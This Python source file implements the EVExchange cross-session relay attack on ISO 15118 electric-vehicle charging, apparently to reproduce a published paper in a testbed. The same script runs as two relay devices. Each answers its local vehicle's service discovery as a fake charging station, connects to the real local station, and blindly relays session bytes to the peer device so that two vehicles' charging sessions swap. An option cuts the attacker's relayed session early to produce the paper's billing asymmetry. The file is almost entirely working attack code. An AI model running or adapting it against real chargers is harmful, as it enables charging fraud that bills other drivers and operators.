"""
Dev1/Dev2 -- the actual EVExchange cross-session relay attack (Conti et al.,
"EVExchange: A Relay Attack on Electric Vehicle Charging System", see
evexchange_attack.pdf in the repo root), as opposed to proxy01.py/
evil_secc.py/evil_evcc.py, which are a single-session MITM with (optional)
real content visibility -- a different, more general capability the paper's
attack doesn't need and doesn't use.

One identical script runs as both Dev1 and Dev2 -- they're mirror images of
each other, each a three-homed relay:
  - a local-EVCC leg (SDP responder + TCP listener facing this Dev's own
    local real EVCC, playing "fake SECC" -- same SDP-construction classes
    evil_secc.py uses);
  - a local-SECC leg (SDP initiator + TCP connection to this Dev's own
    local real SECC, playing "fake EVCC" -- same SDP classes
    evil_evcc.py uses);
  - a relay_link connection to the *other* Dev, carrying whichever
    direction's session this Dev's local-EVCC leg just triggered.

The cross-wire: bytes arriving on the local-EVCC leg are forwarded to the
*peer* Dev over relay_link (not back to this Dev's own local-SECC leg) --
the peer's local-SECC leg is what actually receives them. So this Dev's
local real EVCC's session ends up talking to the *peer's* local real SECC,
and vice versa, while each real SECC's cable still only ever energizes
whatever's physically plugged into it. That swap (of *data*, never
*energy*) is the entire attack -- see README "EVExchange cross-session
relay".

Unlike evil_secc.py/evil_evcc.py, this is a **pure blind relay**: no TLS
termination, no EXI decode, no certs of any kind needed by this script.
Every byte -- plaintext or TLS handshake alike -- is forwarded completely
unexamined, exactly matching the paper's own threat model ("the attacker is
only able to stop and forward the communication flow"). The only thing
relay_link's small control handshake (write_json_frame/read_json_frame,
from proxy/common.py) carries is the SDP Security byte, so both real
endpoints' own SDP negotiation stays consistent -- it never touches HLC
message content.
"""

import sys, os, socket, asyncio, datetime, argparse, ipaddress

parser = argparse.ArgumentParser(
    description="Dev1/Dev2 -- EVExchange cross-session relay (see evexchange_attack.pdf)")
parser.add_argument("--secc-net-v4", required=True, help="IPv4 CIDR of this Dev's local-SECC-facing network, e.g. 172.20.0.0/16")
parser.add_argument("--secc-net-v6", required=True, help="IPv6 CIDR of this Dev's local-SECC-facing network, e.g. 2001:db8:1::/64")
parser.add_argument("--evcc-net-v4", required=True, help="IPv4 CIDR of this Dev's local-EVCC-facing network")
parser.add_argument("--evcc-net-v6", required=True, help="IPv6 CIDR of this Dev's local-EVCC-facing network")
parser.add_argument("--peer-host", required=True,
                     help="Hostname/IP of the other Dev on relay_link (e.g. Dev2, if this is Dev1)")
parser.add_argument("--stop-after-s", type=float, default=None,
                     help="Forcibly end the session THIS Dev's local EVCC triggered, this many "
                          "seconds after the local EVCC connects -- simulates the attacker "
                          "stopping their own (relayed) session early, which is what produces "
                          "the paper's billing asymmetry. Same effect as ATTACKER_STOP_AFTER_S "
                          "env var. Apply this on whichever Dev's local EVCC is the attacker's.")
parser.add_argument("--capture", action="store_true", help="Save relayed bytes to dev_relay_capture.log")
parser.add_argument("--show-hex", action="store_true", help="Print hex previews of relayed bytes")
args = parser.parse_args()

CAPTURE_FILE = "dev_relay_capture.log"
SHOW_PACKET_HEX = args.show_hex
ENABLE_CAPTURE = args.capture

STOP_AFTER_S = args.stop_after_s
if STOP_AFTER_S is None and os.environ.get("ATTACKER_STOP_AFTER_S"):
    STOP_AFTER_S = float(os.environ["ATTACKER_STOP_AFTER_S"])

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from common import discover_secc_evcc_interfaces, write_json_frame, read_json_frame
from iso15118.shared.messages.sdp import SDPRequest, SDPResponse, Security, Transport, create_sdp_response
from iso15118.shared.messages.v2gtp import V2GTPMessage
from iso15118.shared.messages.enums import ISOV2PayloadTypes, Protocol

LISTEN_HOST = '::'
UDP_PORT = 15118
SDP_MULTICAST_GROUP = 'ff02::1'
SDP_SERVER_PORT = 15118
SDP_TIMEOUT_S = 3
LOCAL_FAKE_SECC_PORT = 55000   # this Dev's own fake-SECC listener, facing its local real EVCC
RELAY_PORT = 7000              # relay_link -- both Devs listen AND connect out on this


def log_and_capture(direction, data):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"[{ts}] {direction} {len(data)} bytes")
    if SHOW_PACKET_HEX:
        hex_preview = data.hex()
        if len(hex_preview) > 128:
            hex_preview = hex_preview[:128] + "..."
        print(f"    {hex_preview}")
    if ENABLE_CAPTURE:
        with open(CAPTURE_FILE, "a") as f:
            f.write(f"{ts} {direction} len={len(data)} data={data.hex()}\n")


async def pipe(reader, writer, direction):
    """
    Blind byte relay -- no framing, no decode. Unlike proxy01.py's
    pipe_plaintext (which needs V2GTP message boundaries for
    --debug/--tamper), nothing here ever looks at the content, so any
    chunking is fine; this is the same shape as proxy01.py's pipe_tls
    (opaque relay), just used for every byte in both directions,
    TLS-protected or not.
    """
    while True:
        data = await reader.read(4096)
        if not data:
            break
        writer.write(data)
        await writer.drain()
        log_and_capture(direction, data)


async def relay_both_ways(reader_a, writer_a, reader_b, writer_b, label_a_to_b, label_b_to_a):
    try:
        await asyncio.gather(
            pipe(reader_a, writer_b, label_a_to_b),
            pipe(reader_b, writer_a, label_b_to_a),
        )
    except Exception as e:
        print(f"Relay error ({label_a_to_b}/{label_b_to_a}): {e}")
    finally:
        for w in (writer_a, writer_b):
            try:
                w.close()
            except Exception:
                pass


async def discover_real_secc(security, secc_scope_id):
    """
    This Dev's own genuine SDP exchange with its LOCAL real SECC, same
    classes/approach as evil_evcc.py's discover_real_secc(). Returns
    (secc_ip, secc_port). Raises TimeoutError/ValueError on failure.
    """
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 1)
    if secc_scope_id is not None:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_IF, secc_scope_id)

    sdp_request = SDPRequest(security, Transport.TCP)
    request_bytes = V2GTPMessage(
        Protocol.ISO_15118_2, ISOV2PayloadTypes.SDP_REQUEST, sdp_request.to_payload()
    ).to_bytes()
    sock.sendto(request_bytes, (SDP_MULTICAST_GROUP, SDP_SERVER_PORT))
    print(f"Sent our own SDP Request to the local real SECC: {sdp_request}")

    sock.settimeout(SDP_TIMEOUT_S)
    try:
        response, _ = sock.recvfrom(4096)
    except socket.timeout:
        sock.close()
        raise TimeoutError("No SDP response from the local real SECC")
    sock.close()

    v2gtp_msg = V2GTPMessage.from_bytes(Protocol.UNKNOWN, response)
    sdp_response = SDPResponse.from_payload(v2gtp_msg.payload)
    print(f"Received SDP Response from the local real SECC: {sdp_response}")
    secc_ip = str(ipaddress.IPv6Address(sdp_response.ip_address))
    return secc_ip, sdp_response.port


async def handle_relay_link_connection(reader, writer, secc_scope_id):
    """
    Server side: a peer Dev has connected because ITS local EVCC wants to
    relay a session. Discover+connect to OUR local real SECC (matching the
    requested security mode) and, once ready, switch to blind relay
    between this relay_link connection and that local-SECC connection.
    """
    peer_addr = writer.get_extra_info('peername')
    print(f"\nAccepted relay_link connection from peer at {peer_addr}")
    try:
        msg = await read_json_frame(reader)
    except asyncio.IncompleteReadError:
        return
    if msg.get("type") != "sdp_request":
        print(f"Unexpected first relay_link message: {msg}")
        return

    security = Security(msg["security"])
    try:
        secc_ip, secc_port = await discover_real_secc(security, secc_scope_id)
    except Exception as e:
        print(f"Could not discover the local real SECC: {e}")
        await write_json_frame(writer, {"type": "secc_unreachable", "reason": str(e)})
        return

    print(f"Connecting to local real SECC at {secc_ip}%{secc_scope_id}:{secc_port} "
          f"(blind relay -- not terminating TLS, even if this session uses it)")
    try:
        secc_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        secc_sock.bind((LISTEN_HOST, 0, 0, secc_scope_id))
        secc_sock.connect((secc_ip, secc_port, 0, secc_scope_id))
        secc_sock.setblocking(False)
        secc_reader, secc_writer = await asyncio.open_connection(sock=secc_sock)
    except Exception as e:
        print(f"Could not connect to the local real SECC: {e}")
        await write_json_frame(writer, {"type": "secc_unreachable", "reason": str(e)})
        return

    print(f"Connected to local real SECC at {secc_ip}%{secc_scope_id}:{secc_port}")
    await write_json_frame(writer, {"type": "secc_ready"})

    await relay_both_ways(reader, writer, secc_reader, secc_writer,
                           "peer→localSECC", "localSECC→peer")
    print("Closed relay_link connection (incoming) -- local-SECC leg done")


async def run_relay_link_server(peer_port_for_log, secc_scope_id):
    server = await asyncio.start_server(
        lambda r, w: handle_relay_link_connection(r, w, secc_scope_id),
        host="0.0.0.0", port=RELAY_PORT)
    print(f"\nrelay_link listener on 0.0.0.0:{RELAY_PORT} (for the peer Dev)")
    async with server:
        await server.serve_forever()


async def handle_local_evcc_sdp_and_session(own_ip_packed, own_ip, local_ips,
                                             udp_sock, client_addr, sdp_request,
                                             peer_host):
    """
    This Dev's local real EVCC sent an SDP request. Hand it off to the peer
    Dev over relay_link, and if the peer confirms its own local real SECC
    is reachable, answer the local EVCC's SDP request ourselves and accept
    its TCP/TLS connection -- then blind-relay it to the peer over the
    SAME relay_link connection we just opened.
    """
    print(f"\nReceived SDP Request from local EVCC {client_addr}: {sdp_request}")

    print(f"Connecting to peer Dev at {peer_host}:{RELAY_PORT} ...")
    try:
        peer_reader, peer_writer = await asyncio.open_connection(peer_host, RELAY_PORT)
    except Exception as e:
        print(f"Could not reach peer Dev: {e} -- dropping this SDP request")
        return

    await write_json_frame(peer_writer, {"type": "sdp_request", "security": int(sdp_request.security)})
    try:
        reply = await read_json_frame(peer_reader)
    except asyncio.IncompleteReadError:
        print("Peer Dev's relay_link connection closed before replying -- dropping this SDP request")
        return

    if reply.get("type") != "secc_ready":
        print(f"Peer Dev could not reach its local real SECC "
              f"({reply.get('reason', 'unknown reason')}) -- not answering this SDP request")
        peer_writer.close()
        return

    tls_enabled = sdp_request.security == Security.TLS
    print(f"Peer Dev is ready; starting our own {'TLS-shaped' if tls_enabled else 'plain'} "
          f"listener for the local EVCC (blind relay -- no TLS termination here either)")

    session_done = asyncio.Event()

    async def _handle(evcc_reader, evcc_writer):
        addr = evcc_writer.get_extra_info('peername')
        print(f"\nAccepted TCP connection from local EVCC: {addr}")
        stopper_task = None
        if STOP_AFTER_S is not None:
            async def _stop_after():
                await asyncio.sleep(STOP_AFTER_S)
                print(f"\n[ATTACKER] --stop-after-s={STOP_AFTER_S} elapsed -- forcibly ending "
                      f"this relayed session now (simulating the attacker stopping their own "
                      f"charge early)\n")
                evcc_writer.close()
                peer_writer.close()
            stopper_task = asyncio.create_task(_stop_after())
        try:
            await relay_both_ways(evcc_reader, evcc_writer, peer_reader, peer_writer,
                                   "localEVCC→peer", "peer→localEVCC")
        finally:
            if stopper_task is not None:
                stopper_task.cancel()
            session_done.set()

    # Note: server stays bound to a fixed port for the lifetime of this one
    # session, same one-session-at-a-time pattern as evil_secc.py.
    server = await asyncio.start_server(_handle, host=LISTEN_HOST, port=LOCAL_FAKE_SECC_PORT)

    sdp_response = create_sdp_response(sdp_request, own_ip_packed, LOCAL_FAKE_SECC_PORT, tls_enabled)
    response_bytes = V2GTPMessage(
        Protocol.ISO_15118_2, ISOV2PayloadTypes.SDP_RESPONSE, sdp_response.to_payload()
    ).to_bytes()
    udp_sock.sendto(response_bytes, client_addr)
    print(f"Sent our own SDP response to local EVCC at {client_addr}: {sdp_response}")

    async with server:
        await session_done.wait()
        server.close()
        await server.wait_closed()
    print("\nLocal-EVCC session complete -- listening for the next SDP request\n")


async def run_local_evcc_sdp_loop(own_ip, own_scope_id, peer_host):
    udp_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    udp_sock.bind((LISTEN_HOST, UDP_PORT))
    udp_sock.setblocking(True)
    print(f"\nUDP SDP responder (local-EVCC leg) listening on [{LISTEN_HOST}]:{UDP_PORT}")

    loop = asyncio.get_running_loop()
    def blocking_recv(): return udp_sock.recvfrom(4096)

    local_ips = {own_ip}
    own_ip_packed = ipaddress.IPv6Address(own_ip).packed

    while True:
        data, client_addr = await loop.run_in_executor(None, blocking_recv)
        if client_addr[0] in local_ips:
            continue
        try:
            v2gtp_msg = V2GTPMessage.from_bytes(Protocol.UNKNOWN, data)
            if v2gtp_msg.payload_type != ISOV2PayloadTypes.SDP_REQUEST:
                raise ValueError(f"not an SDPRequest (payload_type={v2gtp_msg.payload_type})")
            sdp_request = SDPRequest.from_payload(v2gtp_msg.payload)
        except Exception as e:
            print(f"Ignoring non-SDP-request datagram from {client_addr}: {e}")
            continue

        await handle_local_evcc_sdp_and_session(
            own_ip_packed, own_ip, local_ips, udp_sock, client_addr, sdp_request, peer_host)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    roles = loop.run_until_complete(discover_secc_evcc_interfaces(
        secc_net_v4=ipaddress.ip_network(args.secc_net_v4),
        secc_net_v6=ipaddress.ip_network(args.secc_net_v6),
        evcc_net_v4=ipaddress.ip_network(args.evcc_net_v4),
        evcc_net_v6=ipaddress.ip_network(args.evcc_net_v6),
    ))

    print(f"\nLocal-SECC-facing / local-EVCC-facing interfaces "
          f"(subnets {args.secc_net_v4}/{args.evcc_net_v4}):")
    if "secc" not in roles:
        print(f"ERROR: no interface found on {args.secc_net_v4} / {args.secc_net_v6}")
        sys.exit(1)
    if "evcc" not in roles:
        print(f"ERROR: no interface found on {args.evcc_net_v4} / {args.evcc_net_v6}")
        sys.exit(1)

    secc_ip, secc_scope_id = roles["secc"]
    evcc_ip, evcc_scope_id = roles["evcc"]
    print(f"  local-secc-leg: {secc_ip} -> scope {secc_scope_id}")
    print(f"  local-evcc-leg: {evcc_ip} -> scope {evcc_scope_id}")

    if STOP_AFTER_S is not None:
        print(f"  ATTACKER_STOP_AFTER_S={STOP_AFTER_S}: sessions THIS Dev's local EVCC "
              f"triggers will be forcibly cut after {STOP_AFTER_S}s")

    relay_link_task = loop.create_task(run_relay_link_server(RELAY_PORT, secc_scope_id))
    local_evcc_task = loop.create_task(run_local_evcc_sdp_loop(evcc_ip, evcc_scope_id, args.peer_host))
    loop.run_until_complete(asyncio.gather(relay_link_task, local_evcc_task))
